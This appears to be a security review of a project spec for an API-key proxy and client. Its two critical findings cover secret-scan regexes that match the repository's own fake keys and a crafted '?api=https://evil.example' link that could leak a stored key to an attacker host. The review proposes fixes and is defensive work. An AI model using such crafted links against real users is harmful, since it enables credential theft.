Scope: key lifecycle, proxy hardening, API-shape vs R3, response validation, CF worker, retry/budget, races. SPEC read-only. Evidence checked: S1 (+ADDENDUM 1/2), R3, `git ls-files`, regex run of U-40 patterns over repo.

## Critical

S-01 | Critical | §7.2 U-40 (l.1211) vs l.1231, l.1282, `.agent/reports/R3.md:117` | U-40 fails on day one against the repo's own files. Verified with grep: `Bearer test-key-SENTINEL-123` (SPEC l.1231, 21 chars) matches `/Bearer\s+[A-Za-z0-9._-]{20,}/`; `sk-abcdefghijklmnopqrstu` (SPEC l.1282, E28) matches `/sk-[A-Za-z0-9_-]{16,}/`; tracked `.agent/reports/R3.md:117` `Bearer sk-invalid-REDACTED-test` matches both. The tests/e2e and proxy.test files that implement E28/P-03 will match too. Result: the implementer either weakens the core secret-scan test or adds broad excludes on a guess → the guard is gutted. | Add to U-40: "Fixture/sentinel values MUST contain the literal substring `SENTINEL` or `FAKE` (for example `sk-FAKE-abcdefghijklmnop`, `test-key-SENTINEL-123`). U-40 skips a match only if the matched text contains `SENTINEL`, `FAKE` or `REDACTED`. No path-based excludes. Change E28 to `/?key=sk-FAKE-abcdefghijklmnop`." Also the env-value check stays unconditional. |
S-02 | Critical | §5.7 l.1104 (`?api=<worker-url>`) vs FR-ARCH-05 l.947 (`connect-src 'self'`) vs FR-KEY-01 | Contradiction plus key-exfiltration vector. The CSP blocks any fetch to a worker URL, so `?api=` cannot work. An implementer told to make it work will loosen `connect-src` (to `https:` or `*`). After that, a crafted link `https://<user>.github.io/systemone-microcircuit/?api=https://evil.example&mode=live` makes the client POST to the attacker. If the client attaches `X-JEV-Key` (the spec never says it must not for non-same-origin), any key the visitor has remembered is exfiltrated. Also unspecified: what health/keySource a worker returns. | Replace the last sentence of §5.7 with: "The page has NO URL parameter for the API base. A presenter using the Worker forks the repo, sets `const API_BASE = "https://<worker>"` in `docs/js/jev/client.js` and adds that exact origin to `connect-src`. The client MUST send `X-JEV-Key` only when the request URL is same-origin (`new URL(url, location.href).origin === location.origin`); otherwise it never attaches a key. The Worker ignores `X-JEV-Key` and always reports `keySource:"env"`." Add U-53: a cross-origin base never gets `X-JEV-Key`; unknown `?api=` is ignored. |

## Verdict
PASS-WITH-FIXES. API shape matches R3 exactly; the proxy core (127.0.0.1 bind, Host check, Origin + Content-Type CSRF block, 32 KB cap, no CORS, redaction, budget on both server and client, bounded response effects) is sound. S-01 and S-02 must be fixed before implementation; S-03..S-08 before T08/T09/T16/T17.
